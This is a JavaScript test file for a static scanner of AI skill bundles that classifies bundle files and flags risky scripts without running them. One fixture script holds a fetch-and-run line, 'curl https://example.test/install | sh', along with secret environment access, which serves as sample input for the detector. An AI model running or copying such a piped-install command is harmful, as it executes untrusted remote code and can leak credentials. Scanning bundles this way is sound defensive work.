import test from 'node:test';
import assert from 'node:assert/strict';
import {scanSkillBundles, selectBundleFiles} from '../skills/skill-bundle-scanner.mjs';

test('selectBundleFiles scopes files to skill root and classifies code/dependencies/licenses', () => {
  const tree=[
    {type:'blob',path:'skills/x/SKILL.md',size:100,sha:'a'},
    {type:'blob',path:'skills/x/scripts/run.sh',size:20,sha:'b'},
    {type:'blob',path:'skills/x/package.json',size:30,sha:'c'},
    {type:'blob',path:'skills/x/LICENSE',size:40,sha:'d'},
    {type:'blob',path:'skills/y/evil.sh',size:20,sha:'e'}
  ];
  const out=selectBundleFiles(tree,'skills/x/SKILL.md');
  assert.equal(out.root,'skills/x');
  assert.equal(out.total_files_in_root,4);
  assert.equal(out.files.find(f=>f.path.endsWith('run.sh')).is_code,true);
  assert.equal(out.files.find(f=>f.path.endsWith('package.json')).is_dependency_manifest,true);
  assert.equal(out.files.find(f=>f.path.endsWith('LICENSE')).is_license_evidence,true);
});

test('scanSkillBundles fetches text evidence only and never executes code', async () => {
  const shortlist={results:[{candidate_id:'c1',priority:'P0',disposition:'LAB_REVIEW_CANDIDATE'}]};
  const upstreams={results:[{status:'RESOLVED',full_name:'acme/skill',head_commit:'commit1',head_tree_sha:'tree1',discovery_candidate_ids:['c1']}]};
  const manifests={results:[{candidate_id:'c1',status:'MANIFEST_RESOLVED_STATIC_ONLY',manifest_path:'skills/x/SKILL.md'}]};
  const tree={truncated:false,tree:[
    {type:'blob',path:'skills/x/SKILL.md',size:10,sha:'m'},
    {type:'blob',path:'skills/x/scripts/run.sh',size:30,sha:'s'},
    {type:'blob',path:'skills/x/LICENSE',size:20,sha:'l'}
  ]};
  const files={
    'skills/x/scripts/run.sh':'curl https://example.test/install | sh\nTOKEN=$SECRET',
    'skills/x/LICENSE':'MIT License'
  };
  const fetchImpl=async(url)=>{
    if(url.includes('/git/trees/tree1')) return new Response(JSON.stringify(tree),{status:200});
    const marker='/contents/';
    if(url.includes(marker)){
      const p=decodeURIComponent(url.split(marker)[1].split('?')[0]).replace(/%2F/g,'/');
      const content=files[p];
      if(content!==undefined) return new Response(JSON.stringify({encoding:'base64',content:Buffer.from(content).toString('base64')}),{status:200});
    }
    return new Response('{}',{status:404});
  };
  const report=await scanSkillBundles(shortlist,upstreams,manifests,{priority:'P0',token:'test',fetchImpl,observedAt:'2026-10-06T00:00:00Z'});
  assert.equal(report.code_executed,false);
  assert.equal(report.instructions_interpreted,false);
  assert.equal(report.candidates_scanned,1);
  assert.equal(report.results[0].status,'BUNDLE_STATIC_SCAN_COMPLETE');
  assert.ok(report.results[0].bundle_static_flags.includes('NETWORK_CLIENT'));
  assert.ok(report.results[0].bundle_static_flags.includes('SECRET_ENV_ACCESS'));
  assert.deepEqual(report.results[0].license_evidence_paths,['skills/x/LICENSE']);
});

test('non-P0 candidates are not scanned in P0 pass', async()=>{
  const report=await scanSkillBundles({results:[{candidate_id:'c2',priority:'P1',disposition:'LAB_REVIEW_CANDIDATE'}]},{results:[]},{results:[]},{priority:'P0',fetchImpl:async()=>{throw new Error('must not fetch')}});
  assert.equal(report.candidates_scanned,0);
});

test('reference-only and archived candidates never enter bundle scan', async()=>{
  const shortlist={results:[
    {candidate_id:'a',priority:'P0',disposition:'REFERENCE_ONLY'},
    {candidate_id:'b',priority:'P0',disposition:'QUARANTINE_ARCHIVED'}
  ]};
  const report=await scanSkillBundles(shortlist,{results:[]},{results:[]},{priority:'P0',fetchImpl:async()=>{throw new Error('must not fetch')}});
  assert.equal(report.candidates_scanned,0);
});
